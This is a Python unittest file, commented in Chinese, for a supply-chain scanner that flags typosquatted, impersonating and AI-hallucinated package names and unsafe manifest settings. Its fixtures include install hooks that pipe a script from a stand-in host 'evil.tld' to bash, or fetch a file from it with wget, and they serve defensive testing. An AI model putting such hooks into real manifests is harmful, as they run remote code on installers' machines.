"""
供应链 / 幻觉包（slopsquatting）离线检测测试

覆盖 scanner.rules 的:
  - check_package_name(): typosquat / homoglyph / 品牌仿冒 / 依赖混淆 /
                          跨注册表混淆 / 复合式幻觉包(slopsquat)
  - check_dependency_hygiene(): 安装脚本投毒 / 不可信来源 / 未锁定版本 / 缺 lockfile
以及 scanner.engine.dependency_analysis() 的端到端接线。

全部为纯离线断言，不发起任何网络请求。
"""

import json
import os
import sys
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from scanner.rules import (  # noqa: E402
    check_package_name,
    check_dependency_hygiene,
    NPM_PACKAGE_CATALOG,
    PYPI_PACKAGE_CATALOG,
    LEGIT_PACKAGE_CATALOG,
)
from scanner.engine import dependency_analysis  # noqa: E402


def _types(findings):
    return {f.get("type") for f in findings}


class TestPackageNameHeuristics(unittest.TestCase):
    """check_package_name 离线启发式"""

    def test_legit_package_no_finding(self):
        """可信名录内的包不应告警"""
        for pkg in ("express", "requests", "react", "fastapi", "langchain-core"):
            self.assertEqual(
                check_package_name(pkg, "npm" if pkg in NPM_PACKAGE_CATALOG else "pypi"),
                [], f"{pkg} 不应被判为可疑",
            )

    def test_typosquat_edit_distance(self):
        """编辑距离 1 的仿冒名应判为 typosquatting"""
        findings = check_package_name("expres", "npm")
        self.assertIn("typosquatting", _types(findings))
        self.assertEqual(findings[0]["severity"], "high")
        self.assertEqual(findings[0]["owasp_category"], "MCP04")

    def test_homoglyph_normalization(self):
        """形近字符投毒（0->o）应被归一化识别"""
        findings = check_package_name("l0dash", "npm")
        self.assertIn("typosquatting", _types(findings))

    def test_brand_impersonation(self):
        """借用厂商品牌 + 社工词应判为品牌仿冒"""
        findings = check_package_name("openai-official-apikey", "pypi")
        self.assertIn("brand_impersonation", _types(findings))

    def test_dependency_confusion_internal_namespace(self):
        """内部命名空间词出现在公共 manifest 应告警"""
        findings = check_package_name("acme-internal-utils", "npm")
        self.assertIn("dependency_confusion", _types(findings))
        self.assertEqual(findings[0]["severity"], "medium")

    def test_cross_registry_confusion_npm_name_in_pypi(self):
        """npm 生态名出现在 Python 依赖中（研究: 8.7% 交叉命中）"""
        findings = check_package_name("express", "pypi")
        self.assertIn("cross_registry_confusion", _types(findings))

    def test_cross_registry_confusion_pypi_name_in_npm(self):
        """PyPI 生态名出现在 npm 依赖中"""
        findings = check_package_name("beautifulsoup4", "npm")
        self.assertIn("cross_registry_confusion", _types(findings))

    def test_slopsquat_non_similar_hallucination(self):
        """
        核心新增能力：与真实包**不形近**的复合式幻觉包。
        react-codeshift 是 2026-01 真实案例（jscodeshift + react-codemod 融合），
        编辑距离检测对其完全失效。
        """
        findings = check_package_name("react-codeshift", "npm")
        self.assertIn("suspected_hallucinated_package", _types(findings))
        f = [x for x in findings if x["type"] == "suspected_hallucinated_package"][0]
        self.assertEqual(f["severity"], "info", "advisory 不应扣分")
        self.assertIn("remediation", f)

    def test_slopsquat_more_examples(self):
        """其它复合式幻觉命名同样应被 advisory 捕获"""
        for name, eco in (
            ("langchain-mcp-toolkit", "pypi"),
            ("openai-agent-helpers", "pypi"),
            ("mcp-server-autoconfig", "npm"),
        ):
            self.assertIn(
                "suspected_hallucinated_package",
                _types(check_package_name(name, eco)),
                f"{name} 应产生幻觉包 advisory",
            )

    def test_slopsquat_no_false_positive_on_common_composites(self):
        """常见合法复合包不应产生幻觉 advisory（误报控制）"""
        for name, eco in (
            ("react-router-dom", "npm"),
            ("react-redux", "npm"),
            ("langchain-community", "pypi"),
            ("pytest-asyncio", "pypi"),
        ):
            self.assertNotIn(
                "suspected_hallucinated_package",
                _types(check_package_name(name, eco)),
                f"{name} 是合法包，不应误报",
            )

    def test_single_token_unknown_not_flagged_as_hallucination(self):
        """单段无锚点的陌生包名不进幻觉通道（避免全量误报）"""
        self.assertNotIn(
            "suspected_hallucinated_package",
            _types(check_package_name("zzqweirdlib", "npm")),
        )

    def test_scoped_package_name_handling(self):
        """npm scope 前缀应被正确剥离"""
        self.assertEqual(check_package_name("@types/express", "npm"), [])

    def test_invalid_input_is_safe(self):
        """非法输入不应抛异常"""
        for bad in (None, "", 123, [], {}):
            self.assertEqual(check_package_name(bad, "npm"), [])

    def test_catalog_union_backward_compatible(self):
        """LEGIT_PACKAGE_CATALOG 仍为两生态并集（向后兼容）"""
        self.assertTrue(NPM_PACKAGE_CATALOG.issubset(LEGIT_PACKAGE_CATALOG))
        self.assertTrue(PYPI_PACKAGE_CATALOG.issubset(LEGIT_PACKAGE_CATALOG))


class TestDependencyHygiene(unittest.TestCase):
    """check_dependency_hygiene manifest 级检查"""

    def test_install_script_poisoning(self):
        """postinstall 中的 curl|bash 应判为 critical"""
        files = {
            "package.json": json.dumps({
                "name": "demo",
                "scripts": {"postinstall": "curl http://evil.tld/x.sh | bash"},
                "dependencies": {"express": "4.18.2"},
            }),
            "package-lock.json": "{}",
        }
        findings = check_dependency_hygiene(files)
        self.assertIn("install_script_execution", _types(findings))
        crit = [f for f in findings if f["type"] == "install_script_execution"][0]
        self.assertEqual(crit["severity"], "critical")

    def test_untrusted_source_git_spec(self):
        """git+ / http:// 直装应判为 high"""
        files = {
            "package.json": json.dumps({
                "dependencies": {"pkg": "git+https://x.tld/a.git", "b": "http://x.tld/b.tgz"},
            }),
            "package-lock.json": "{}",
        }
        findings = check_dependency_hygiene(files)
        self.assertIn("untrusted_dependency_source", _types(findings))
        self.assertGreaterEqual(
            len([f for f in findings if f["type"] == "untrusted_dependency_source"]), 2
        )

    def test_unpinned_version(self):
        """* / latest 应判为未锁定"""
        files = {
            "package.json": json.dumps({"dependencies": {"lodash": "*", "chalk": "latest"}}),
            "yarn.lock": "",
        }
        findings = check_dependency_hygiene(files)
        self.assertEqual(
            len([f for f in findings if f["type"] == "unpinned_dependency"]), 2
        )

    def test_missing_lockfile(self):
        """有依赖但无 lockfile 应有 low 级提示"""
        files = {"package.json": json.dumps({"dependencies": {"express": "^4.0.0"}})}
        findings = check_dependency_hygiene(files)
        self.assertIn("missing_lockfile", _types(findings))

    def test_lockfile_present_no_warning(self):
        """存在 lockfile 时不应提示缺失"""
        files = {
            "package.json": json.dumps({"dependencies": {"express": "4.18.2"}}),
            "pnpm-lock.yaml": "lockfileVersion: 6.0",
        }
        self.assertNotIn("missing_lockfile", _types(check_dependency_hygiene(files)))

    def test_requirements_untrusted_source(self):
        """requirements.txt 的 git+/http 来源应判为 high"""
        files = {"requirements.txt": "requests==2.31.0\ngit+https://x.tld/pkg.git\n"}
        findings = check_dependency_hygiene(files)
        self.assertIn("untrusted_dependency_source", _types(findings))

    def test_requirements_extra_index_url(self):
        """--extra-index-url 应判为依赖混淆风险"""
        files = {"requirements.txt": "--extra-index-url http://internal.tld/simple\nfoo==1.0\n"}
        self.assertIn("dependency_confusion", _types(check_dependency_hygiene(files)))

    def test_clean_manifest_no_findings(self):
        """干净 manifest 不应误报"""
        files = {
            "package.json": json.dumps({
                "dependencies": {"express": "4.18.2", "react": "18.2.0"},
                "scripts": {"build": "webpack", "test": "jest"},
            }),
            "package-lock.json": "{}",
        }
        self.assertEqual(check_dependency_hygiene(files), [])

    def test_malformed_json_is_safe(self):
        """损坏的 package.json 不应抛异常"""
        self.assertEqual(check_dependency_hygiene({"package.json": "{not json"}), [])

    def test_non_dict_input_is_safe(self):
        self.assertEqual(check_dependency_hygiene(None), [])
        self.assertEqual(check_dependency_hygiene("string"), [])


class TestEngineIntegration(unittest.TestCase):
    """dependency_analysis 端到端接线"""

    def test_hygiene_wired_into_dependency_analysis(self):
        files = {
            "package.json": json.dumps({
                "scripts": {"preinstall": "wget http://evil.tld/p.py"},
                "dependencies": {"expres": "1.0.0"},
            }),
        }
        result = dependency_analysis(files)
        types = _types(result["findings"])
        self.assertIn("install_script_execution", types, "安装脚本检测应已接线")
        self.assertIn("typosquatting", types, "包名检测应仍生效")
        self.assertEqual(result["total_dependencies"], 1)

    def test_requirements_pipeline(self):
        files = {"requirements.txt": "requests==2.31.0\nrequesst==1.0.0\n"}
        result = dependency_analysis(files)
        self.assertIn("typosquatting", _types(result["findings"]))
        self.assertEqual(result["total_dependencies"], 2)

    def test_advisory_findings_are_capped(self):
        """幻觉包 advisory 最多 5 条，避免刷屏"""
        deps = {f"react-fakepkg{i}": "1.0.0" for i in range(12)}
        files = {
            "package.json": json.dumps({"dependencies": deps}),
            "package-lock.json": "{}",
        }
        result = dependency_analysis(files)
        advisories = [
            f for f in result["findings"]
            if f.get("type") == "suspected_hallucinated_package"
        ]
        self.assertLessEqual(len(advisories), 5)
        self.assertGreater(len(advisories), 0)

    def test_advisory_does_not_deduct_score(self):
        """info 级 advisory 在 calculate_scores 中扣 0 分"""
        from scanner.engine import calculate_scores
        dep = {"findings": [{
            "type": "suspected_hallucinated_package",
            "severity": "info",
            "owasp_category": "MCP04",
        }], "dependencies": [], "total_dependencies": 0}
        empty = {"findings": []}
        scores = calculate_scores({"findings": []}, dep, empty, [], [], 1)
        self.assertEqual(scores["security_score"], 100, "info 级 advisory 不应扣安全分")


if __name__ == "__main__":
    unittest.main(verbosity=2)
